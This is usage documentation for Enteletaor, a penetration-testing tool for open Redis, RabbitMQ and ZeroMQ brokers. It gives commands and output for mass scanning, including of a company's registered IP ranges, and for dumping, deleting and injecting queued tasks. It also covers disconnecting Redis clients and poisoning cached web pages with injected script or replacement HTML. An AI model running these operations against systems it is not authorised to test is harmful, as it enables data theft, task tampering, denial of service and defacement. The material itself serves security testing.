Advanced usage
==============

Enteleteaor implements some attacks and has many options to interact with different brokers:

    - Redis
    - RabbitMQ (of AMQP compabible)
    - ZeroMQ

The tool also implements some specifics attacks for Redis server. This document try to collect this information.

There are the 3 kind actions implemented:

    - Scanning
    - Redis actions
    - Tasks actions

Scanner
-------

Enteleteaor implements a scanner that detects open brokers. The scanner is implemented in pure python, with no external dependecies, like ``nmap``.

The reason to implement a native scanner is because in ``nmap`` v7 no all scripts that detects open services works.

.. note::

    You also can pass as target a domain, not only and IP.

Custom ports
++++++++++++

As you can read in :doc:`quickstart` document, you can scan a single host or a network. Syntax is nmap-like.

You can specify other ports that enteleteaor default, using ``-p`` option:

.. code-block:: bash

    # enteleteaor scan -t 10.10.0.10/16 -p 5550,5551

Parallel scanning
+++++++++++++++++

By default, enteleteaor runs 20 concurrent scanning. Internally it's implemented with *greenlets* threads. It means that are not "real" Python threads. You can think about greenlets thread as a lightweight version of threads.

I recommend to use 40 concurrent scanning threads. Don't worry for the overload of your system, green threads will made this possible without a hungry CPU process.

To change concurrency, we use ``-c`` option:

.. code-block:: bash

    # enteleteaor scan -t 10.10.0.10/24 -c 40

Saving results
++++++++++++++

Enteleteaor can export scan results as a JSON format, using ``--output`` option:

.. code-block:: bash

    # enteleteaor scan -t 10.10.0.10 --output results

Or:

.. code-block:: bash

    # enteleteaor scan -t 10.10.0.10 --output results.json

.. note::

    If you don't indicate the file extension, enteleteaor will add it for you.

Company lookup
++++++++++++++

This is a bit strange option. Typing ``-o`` enteleteaor will try to lookup the company name in RIPE and get all IP ranges registered for it, adding then to scanner.

For example, if you try to get scan ``google.com`` it will 1465 new host:

.. code-block:: bash

    # enteletaor -vvvv scan -t google.com -o

    [ * ] Starting Enteletaor execution
    [ * ]   -> Detected registered network '80.239.142.192/26'. Added for scan.
    [ * ]   -> Detected registered network '213.242.89.64/26'. Added for scan.
    [ * ]   -> Detected registered network '92.45.86.16/28'. Added for scan.
    [ * ]   -> Detected registered network '212.179.82.48/28'. Added for scan.
    [ * ]   -> Detected registered network '217.163.1.64/26'. Added for scan.
    [ * ]   -> Detected registered network '80.239.174.64/26'. Added for scan.
    [ * ]   -> Detected registered network '213.253.9.128/26'. Added for scan.
    [ * ]   -> Detected registered network '46.108.1.128/26'. Added for scan.
    [ * ]   -> Detected registered network '213.248.112.64/26'. Added for scan.
    [ * ]   -> Detected registered network '46.61.155.0/24'. Added for scan.
    [ * ]   -> Detected registered network '95.167.107.32/27'. Added for scan.
    [ * ]   -> Detected registered network '195.50.84.192/26'. Added for scan.
    [ * ]   -> Detected registered network '80.239.168.192/26'. Added for scan.
    [ * ]   -> Detected registered network '193.120.166.64/26'. Added for scan.
    [ * ]   -> Detected registered network '213.155.151.128/26'. Added for scan.
    [ * ]   -> Detected registered network '194.44.4.0/24'. Added for scan.
    [ * ]   -> Detected registered network '80.239.229.192/26'. Added for scan.
    [ * ]   -> Detected registered network '213.242.93.192/26'. Added for scan.
    [ * ]   -> Detected registered network '195.100.224.112/28'. Added for scan.
    [ * ]   -> Detected registered network '89.175.35.32/28'. Added for scan.
    [ * ]   -> Detected registered network '89.175.165.0/28'. Added for scan.
    [ * ]   -> Detected registered network '89.175.162.48/29'. Added for scan.
    [ * ]   - Number of targets to analyze: 1465
    [ * ]   - Starting scan
     ...

Tasks
-----

Currently you can do 4 sub-actions for ``tasks`` command.

All of these actions are available **only if broker is open**. An open broker means that not credential are needed for connect to.

.. note::

    But.. **what's a task?** Oks, no problem, let's see:

    When we use a process manager to handle background tasks they use an external communication system. This communication system usually is a broker.

    The processes managers need this communication systems to send the information to the runner. Each runner is waiting for new information to process, and the broker permit delegate the exchange problems.

    So, we call this in information a ``pending task``. This ``task`` is really some information waiting in the broker to be send to the runner.

Listing remote tasks
++++++++++++++++++++

Basic usage
___________

If there are pending tasks in broker queue, we can analyze them. Enteleteaor allow us to list all tasks found. Although there is more than one task of each type in queue, only the task definition is displayed:

.. code-block:: bash

    # enteleteaor -v tasks list-tasks -t 10.10.0.10
    [ * ] Starting Enteletaor execution
    [ * ]   - Trying to connect with server...
    [ * ]   - Remote process found:
    [ * ]      -> tasks.sum (param_0:int, param_1:int)
    [ * ]      -> tasks.send_mail (param_0:str, param_1:str, param_2:str)
    [ * ] Done!

We can see that broker has 2 task definition stored:

    - tasks.sum
    - tasks.send_mail

Export Template
_______________

Enteleteaor also permit inject new tasks to broker (see bellow). The way to inject them is to pass as input a JSON file with the information. Write this file must be a bit hard. To help us, enteleteaor can export a template.

With this template, we only must fill the appropriate fields:

.. code-block:: bash
    :linenos:
    :emphasize-lines: 8

    # enteleteaor -v tasks list-task -t 10.10.0.10 -T my_template -F tasks.send_mail
    [ * ] Starting Enteletaor execution
    [ * ]   - Trying to connect with server...
    [ * ]   - Remote process found:
    [ * ]      -> tasks.sum (param_0:int, param_1:int)
    [ * ]      -> tasks.send_mail (param_0:str, param_1:str, param_2:str)
    [ * ]   - Building template...
    [ * ]   - Template saved at: '/Users/Dani/Documents/Projects/enteletaor/enteletaor_lib/my_template.json'
    [ * ] Done!

    # cat my_template.json
    [{"parameters": [{"param_position": 0, "param_value": null, "param_type": "str"}, {"param_position": 1, "param_value": null, "param_type": "str"}, {"param_position": 2, "param_value": null, "param_type": "str"}], "function": "tasks.send_mail"}]

In this example only export the function ``tasks.send_mail``.

Removing tasks
++++++++++++++

We also can remove **all** pending task from the broker queue. It's so simple:

.. code-block:: bash

    # enteleteaor tasks remove -t 10.10.0.10
    [ * ] Starting Enteletaor execution
    [ * ]   - Trying to connect with server...
    [ * ]    - All tasks removed from '10.10.0.10'
    [ * ] Done!

Dumping tasks content
+++++++++++++++++++++

Basic usage
___________

We can dump the content of tasks simply using ``raw-dump` sub-command:

.. code-block:: bash

    # enteleteaor tasks raw-dump -t 10.10.0.10
    [ * ] Starting Enteletaor execution
    [ * ]   - Trying to connect with server...
    [ * ]   Found process information:
    [ * ]   -  Remote tasks name: 'tasks.sum'
    [ * ]   -  Input parameters:
    [ * ]       -> P0: 1
    [ * ]       -> P1: 0
    [ * ]   Found process information:
    [ * ]   -  Remote tasks name: 'tasks.send_mail'
    [ * ]   -  Input parameters:
    [ * ]       -> P0: marquerite@cordell.com
    [ * ]       -> P1: Can You Afford?
    [ * ]       -> P2: Axis alliance with Italy and Japan.
    [ * ]   Found process information:
    [ * ]   -  Remote tasks name: 'tasks.send_mail'
    [ * ]   -  Input parameters:
    [ * ]       -> P0: amie@cordell.com
    [ * ]       -> P1: Read your review for John Mulaney You're missing out on points Not Cool, Guys DO NOT Commit These Instagram Atrocities
    [ * ]       -> P2: Molotov–Ribbentrop Pact of August 1939, Germany and subsequent declarations of war in Europe concluded with an invasion of Poland by Germany and the subsequent German unconditional surrender on 8 May 1945.
    [ * ]   Found process information:
    [ * ]   -  Remote tasks name: 'tasks.send_mail'
    [ * ]   -  Input parameters:
    [ * ]       -> P0: willard@cordell.com
    [ * ]       -> P1: Wish What are our customers saying?
    [ * ]       -> P2: In June 1941, the European Axis powers and the coalition of the world.
    [ * ]     -> No more messages from server. Exiting...
    [ * ] Done!

Streaming mode
______________

Some times we could want listen new messages available in broker in real time . If we use ``--streaming`` option, enteleteaor will wait for new messages:

.. code-block:: bash
    :linenos:
    :emphasize-lines: 17-20

    # enteleteaor tasks raw-dump -t 10.10.0.10 --streaming
    [ * ] Starting Enteletaor execution
    [ * ]   - Trying to connect with server...
    [ * ]   Found process information:
    [ * ]   -  Remote tasks name: 'tasks.send_mail'
    [ * ]   -  Input parameters:
    [ * ]       -> P0: aletha@cordell.com
    [ * ]       -> P1: Best of Groupon: The Deals That Make Us Proud (Unlike Our Nephew, Steve) Happy Birthday Lindsay - Surprise Inside!
    [ * ]       -> P2: Berlin by Soviet and Polish troops and the refusal of Japan to surrender under its terms, the United States dropped atomic bombs on the Eastern Front, the Allied invasion of Poland by Germany and the Axis.
    [ * ]   Found process information:
    [ * ]   -  Remote tasks name: 'tasks.send_mail'
    [ * ]   -  Input parameters:
    [ * ]       -> P0: amie@cordell.com
    [ * ]       -> P1: Read your review for John Mulaney You're missing out on points Not Cool, Guys DO NOT Commit These Instagram Atrocities
    [ * ]       -> P2: Molotov–Ribbentrop Pact of August 1939, Germany and subsequent declarations of war in Europe concluded with an invasion of Poland by Germany and the subsequent German unconditional surrender on 8 May 1945.
    [ * ]       -> P2: In June 1941, the European Axis powers and the coalition of the world.
    [ * ]   -> No more messages from server. Waiting for 4 seconds and try again..
    [ * ]   -> No more messages from server. Waiting for 4 seconds and try again..
    [ * ]   -> No more messages from server. Waiting for 4 seconds and try again..
    [ * ]   -> No more messages from server. Waiting for 4 seconds and try again..

Output file
___________

We can export results to CVS file using ``--output`` option. The reason to choose this format is because it permit real-time reading. In other words:

Imagine you want to put enteleteaor in streaming mode and, at the same time, put another process to read the information from export file, CSV allow this because each line is independent of others.

Enteleteaor writes in CSV as *append* mode, so it will not overwriting old file content:

.. code-block:: bash
        
    # enteleteaor tasks raw-dump -t 10.10.0.10 --streaming --output dumped_server_file

And, in other console, we can write:

.. code-block:: bash

    # tail -f dumped_server_file.csv

.. note::

    If not extension provided, enteleteaor automatically add .csv

Inject new tasks
++++++++++++++++

Finally, enteleteaor permit us to inject new tasks to the broker flow. The injection only accept one parameter: ``-f`` (``--function-file``).

This parameter need a JSON as input file with the function parameters. Do you remember `Export template`_ option of the list-tasks sub-command?

One we have the JSON file, we can inject the new process:

.. code-block:: bash

    # enteleteaor tasks inject -f my_template.json
    [ * ] Starting Enteletaor execution
    [ * ]   - Building process...
    [ * ]   - Trying to connect with server...
    [ * ]   - Sending processes to '10.10.0.10'
    [ * ]       1) tasks.send_mail
    [ * ] Done!


Redis
-----

Redis is a power full and versatile server. It can act as:

  - Key-value database
  - Broker
  - Cache
  - ...

So, it has it own command and actions:

Getting info
++++++++++++

This action was explained in :doc:`quickstart` document.

Listing connected users
+++++++++++++++++++++++

This action was explained in :doc:`quickstart` document.

Disconnecting users
+++++++++++++++++++

We not only can show all connected users, also can disconnect them. To do that we can use the sub-command ``disconnect``.

Disconnect one user
___________________

This command need as input the client to disconnect. Client must be as format: IP:PORT, as ``connected`` command displays.

.. code-block:: bash
    :linenos:
    :emphasize-lines: 7,13

    # enteleteaor redis connected -t 10.10.0.10
    [ * ] Starting Enteletaor execution
    [ * ] Connected users to '10.10.0.10':
    [ * ]   - 10.10.0.2:52748 (DB: 0)
    [ * ]   - 10.10.0.2:52749 (DB: 0)
    [ * ]   - 10.10.0.2:52752 (DB: 0)
    [ * ]   - 127.0.0.1:42262 (DB: 0)
    [ * ]   - 10.10.0.2:51200 (DB: 0)
    [ * ] Done!

    # enteleteaor redis disconnect -t 10.10.0.10 -c 127.0.0.1:42262
    [ * ] Starting Enteletaor execution
    [ * ]   - Client '127.0.0.1:42264' was disconnected
    [ * ] Done!

Disconnect all users
____________________

If you want to disconnect all connected users, enteleteaor has the shortcut ``--all``:

.. code-block:: bash

    # enteleteaor redis disconnect -t 10.10.0.10 --all

Discovering DBs
+++++++++++++++

By default Redis has 16 databases, but you can add as many as you need. If the database used by the remote server is different to 0 (default database) and you need to discover them, you can use ``discover-dbs``:

.. code-block:: bash

    # enteleteaor redis discover-dbs -t 10.10.0.10
    [ * ] Starting Enteletaor execution
    [ * ] Discovered '10.10.0.10' DBs at '16':
    [ * ]    - DB0 - 4 keys
    [ * ]    - DB1 - Empty
    [ * ]    - DB2 - Empty
    [ * ]    - DB3 - Empty
    [ * ]    - DB4 - Empty
    [ * ]    - DB5 - Empty
    [ * ]    - DB6 - Empty
    [ * ]    - DB7 - Empty
    [ * ]    - DB8 - Empty
    [ * ]    - DB9 - Empty
    [ * ]    - DB10 - Empty
    [ * ]    - DB11 - Empty
    [ * ]    - DB12 - Empty
    [ * ]    - DB13 - Empty
    [ * ]    - DB14 - Empty
    [ * ] Done!

Dumping information
+++++++++++++++++++

Basic usage
___________

One of more interesting thing is display information stored in redis and has the possibility to export it.

``dump`` sub-command permit that:

.. code-block:: bash

    # enteleteaor redis dump -t 10.10.0.10
    [ * ] Starting Enteletaor execution
    [ * ]   - Trying to connect with redis server...
    [ * ]     "b'unacked'":
    [ * ]     {
    [ * ]      "b'a3b415a9-2ce1-4386-b104-94b9a38aee73'":
    [ * ]       {
    [ * ]         "content-encoding": "b'binary'"
    [ * ]         "properties":
    [ * ]          {
    [ * ]            "body_encoding": "b'base64'"
    [ * ]            "delivery_mode": "2"
    [ * ]            "delivery_info":
    [ * ]             {
    [ * ]               "priority": "0"
    [ * ]               "exchange": "b'celery'"
    [ * ]               "routing_key": "b'celery'"
    [ * ]             }
    [ * ]            "delivery_tag":
    [ * ]             {
    [ * ]            "delivery_tag": "b'a3b415a9-2ce1-4386-b104-94b9a38aee73'"
    [ * ]          }
    [ * ]         "headers":
    [ * ]          {
    [ * ]          }
    [ * ]         "body":
    [ * ]          {
    [ * ]            "chord": "None"
    [ * ]            "retries": "0"
    [ * ]            "kwargs":
    [ * ]             {
    [ * ]             }
    [ * ]            "task": "b'tasks.send_mail'"
    [ * ]            "errbacks": "None"
    [ * ]            "taskset": "None"
    [ * ]            "timelimit": "(None, None)"
    [ * ]            "callbacks": "None"
    [ * ]            "eta": "None"
    [ * ]            "id":
    [ * ]             {
    [ * ]            "id": "b'8d772bd5-7f2c-4bef-bc74-aa582aaf0520'"
    [ * ]            "expires": "None"
    [ * ]            "utc": "True"
    [ * ]            "args": "('leatha@elidia.com', 'Guys DO NOT Commit These Instagram Atrocities 10 Engagement Tips to Gobble Over Thanksgiving Buffer has been hacked - here', 'Declaration by the Western Allies and the refusal of Japan to surrender under its terms, the United States emerged as an effort to end pre-war enmities and to create a common identity.')"
    [ * ]          }
    [ * ]         "content-type":
    [ * ]          {
    [ * ]         "content-type": "b'application/x-python-serialize'"
    [ * ]       }
    [ * ] Done!

Exporting results
_________________

Don't worry if above console output is a bit heavy, we can export results to a JSON file using ``-e`` (``--export-results``):

.. code-block:: bash

    # enteleteaor redis dump -t 10.10.0.10 -e dumped_info
    [ * ] Starting Enteletaor execution
    [ * ]   - Trying to connect with redis server...
    [ * ]   - Storing information into 'results.json'
    [ * ]     "b'unacked'":
    [ * ]     {
    [ * ]      "b'a3b415a9-2ce1-4386-b104-94b9a38aee73'":
    [ * ]       {
    [ * ]         "content-encoding": "b'binary'"
    [ * ]         "properties":
    [ * ]          {
    [ * ]            "body_encoding": "b'base64'"
    [ * ]            "delivery_mode": "2"
    [ * ]            "delivery_info":
    [ * ]             {
    [ * ]               "priority": "0"
    [ * ]               "exchange": "b'celery'"
    [ * ]               "routing_key": "b'celery'"
    [ * ]             }
    [ * ]            "delivery_tag":
    [ * ]             {
    [ * ]            "delivery_tag": "b'a3b415a9-2ce1-4386-b104-94b9a38aee73'"
    [ * ]          }
    [ * ]         "headers":
    [ * ]          {
    [ * ]          }
    [ * ]         "body":
    [ * ]          {
    [ * ]            "chord": "None"
    [ * ]            "retries": "0"
    [ * ]            "kwargs":
    [ * ]             {
    [ * ]             }
    [ * ]            "task": "b'tasks.send_mail'"
    [ * ]            "errbacks": "None"
    [ * ]            "taskset": "None"
    [ * ]            "timelimit": "(None, None)"
    [ * ]            "callbacks": "None"
    [ * ]            "eta": "None"
    [ * ]            "id":
    [ * ]             {
    [ * ]            "id": "b'8d772bd5-7f2c-4bef-bc74-aa582aaf0520'"
    [ * ]            "expires": "None"
    [ * ]            "utc": "True"
    [ * ]            "args": "('leatha@elidia.com', 'Guys DO NOT Commit These Instagram Atrocities 10 Engagement Tips to Gobble Over Thanksgiving Buffer has been hacked - here', 'Declaration by the Western Allies and the refusal of Japan to surrender under its terms, the United States emerged as an effort to end pre-war enmities and to create a common identity.')"
    [ * ]          }
    [ * ]         "content-type":
    [ * ]          {
    [ * ]         "content-type": "b'application/x-python-serialize'"
    [ * ]       }
    [ * ] Done!

.. note::

    We don't need to put the extension .json to file. If extension is missing, enteleteaor will add it.

Hide screen output
__________________

If you don't want to display information into screen (useful when Redis contains a lot of information) using ``--no-screen`` option:

.. code-block:: bash

    # enteleteaor redis dump -t 10.10.0.10 -e dumped_info --no-screen
    [ * ] Starting Enteletaor execution
    [ * ]   - Trying to connect with redis server...
    [ * ]   - Storing information into 'results.json'
    [ * ] Done!

Handling cache
++++++++++++++

Redis is commonly used as a centralized cache system. We can handle this cache stored in it.

Finding cache keys
__________________

First step is find possible cache keys in Redis. Enteleteaor has the option ``--search`` that will try to find this keys:

.. code-block:: bash

    # enteleteaor redis cache -t 10.10.0.10
    [ * ] Starting Enteletaor execution
    [ * ] Looking for caches in '10.10.0.10'...
    [ * ]   - Possible cache found in key: 'flask_cache_view//'
    [ * ] Done!

Dumping all cache keys
______________________

If we want to dump, as raw-way, possible cache keys (not only locate) we omit the option ``--search``:

.. code-block:: bash

    # enteleteaor redis cache -t 10.10.0.10
    [ * ] Starting Enteletaor execution
    [ * ]   - Listing cache information:
    [ * ]     -> Key: 'flask_cache_view//'
    [ * ]     -> Content:
         !X<!--
        Author: WebThemez
        Author URL: http://webthemez.com
        License: Creative Commons Attribution 3.0 Unported
        License URL: http://creativecommons.org/licenses/by/3.0/
        -->
        <!doctype html>
        <!--[if IE 7 ]>    <html lang="en-gb" class="isie ie7 oldie no-js"> <![endif]-->
        <!--[if IE 8 ]>    <html lang="en-gb" class="isie ie8 oldie no-js"> <![endif]-->
        <!--[if IE 9 ]>    <html lang="en-gb" class="isie ie9 no-js"> <![endif]-->
        <!--[if (gt IE 9)|!(IE)]><!-->
        <html lang="en-en" class="no-js">
        <!--<![endif]-->
        <head>
        ...

    [ * ] Done!

Dumping specific cache key
__________________________

We can dump only an specific key:

.. code-block:: bash

    # enteleteaor redis cache -t 10.10.0.10 --cache-key "flask_cache_view//"
    [ * ] Starting Enteletaor execution
    [ * ]   - Listing cache information:
    [ * ]     -> Key: 'flask_cache_view//'
    [ * ]     -> Content:
         !X<!--
        Author: WebThemez
        Author URL: http://webthemez.com
        License: Creative Commons Attribution 3.0 Unported
        License URL: http://creativecommons.org/licenses/by/3.0/
        -->
        <!doctype html>
        <!--[if IE 7 ]>    <html lang="en-gb" class="isie ie7 oldie no-js"> <![endif]-->
        <!--[if IE 8 ]>    <html lang="en-gb" class="isie ie8 oldie no-js"> <![endif]-->
        <!--[if IE 9 ]>    <html lang="en-gb" class="isie ie9 no-js"> <![endif]-->
        <!--[if (gt IE 9)|!(IE)]><!-->
        <html lang="en-en" class="no-js">
        <!--<![endif]-->
        <head>
        ...

    [ * ] Done!

Basic cache poisoning
_____________________

Enteleteaor permit us to poison the cache. To enable the cache poisoning we need to enable it with option ``-P``.

By default, enteleteaor will try to inject an HTML <script> tag with an alert message: "You are vulnerable to broker injection".

.. code-block:: bash
        
    # enteleteaor redis cache -P -t 10.10.0.1
    [ * ] Starting Enteletaor execution
    [ * ]   - Trying to connect with redis server...
    [ * ]   - Poisoning enabled
    [ * ]   - Poisoned cache key 'flask_cache_view//' at server '10.10.0.10'
    [ * ] Done!

Custom cache poisoning with
___________________________

We can replace the default behavior adding a custom script code:

**Inline**:

Using ``--payload`` option. This option need a file with the script:

.. code-block:: bash

    # enteleteaor redis cache -P -t 10.10.0.10 --payload "<script>document.write('Say cheeeeers')</script>"
    [ * ] Starting Enteletaor execution
    [ * ]   - Poisoning enabled
    [ * ]   - Poisoned cache key 'b'flask_cache_view//'' at server '10.10.0.10'
    [ * ] Done!

**Using file**:

.. code-block:: bash

    # echo "<script>document.write('Say cheeeeers')</script>" > my_payload.txt
    # enteleteaor redis cache -P -t 10.10.0.10 --file-payload my_payload.txt
    [ * ] Starting Enteletaor execution
    [ * ]   - Poisoning enabled
    [ * ]   - Poisoned cache key 'b'flask_cache_view//'' at server '10.10.0.10'
    [ * ] Done!

Replace cache content
_____________________

Finally, we can replace entire content of cache key using option ``--replace-html``:

.. code-block:: bash

    # echo "<html><head><title>Replaced content</title></head><body><h1>Say cheeeeers again :)</h1></body></html>" > new_html.html
    # enteleteaor redis cache -P -t 10.10.0.10 --replace-html new_html.html
    [ * ] Starting Enteletaor execution
    [ * ]   - Poisoning enabled
    [ * ]   - Poisoned cache key 'flask_cache_view//' at server '10.10.0.10'
    [ * ] Done!
